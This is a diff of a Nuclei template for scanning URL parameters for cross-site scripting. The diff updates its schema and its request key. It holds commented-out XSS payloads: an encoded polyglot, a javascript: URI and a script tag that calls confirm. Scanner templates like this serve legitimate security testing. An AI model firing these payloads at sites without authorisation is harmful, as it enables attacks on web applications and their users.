@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: PARAM-BASED-XSS
 
 #USUAGE     $ cat payloads+urls.txt | nuclei -t param-xss.yaml | awk '{print $6}'
@@ -7,13 +8,13 @@ info:
   author: 25
   severity: high
 
-requests:
+http:
   - method: GET
     path:
        - '{{BaseURL}}' #{{payload}}'
 
 #    payloads:
-#       payload: 
+#       payload:
 #             - 'JavaScript%3A%2F%2F%25250Aalert%3F.(25)%2F%2F%27%2F*%5C%27%2F*%22%2F*%5C%22%2F*%60%2F*%5C%60%2F*%2526apos%3B)%2F*%3C!--%3E%3C%2FTitle%2F%3C%2FStyle%2F%3C%2FScript%2F%3C%2FtextArea%2F%3C%2FiFrame%2F%3C%2FnoScript%3E%5C74k%3CK%2FcontentEditable%2FautoFocus%2FOnFocus%3D%2F*%24%7B%2F*%2F%3B%7B%2F**%2F(confirm)(25)%7D%2F%2F%3E%3CBase%2FHref%3D%2F%2FX55.is%5C76--%3E'
 #             - 'javascript://%250Aalert(25)//?1'
 #             - '"><script>confirm(25)</script>'
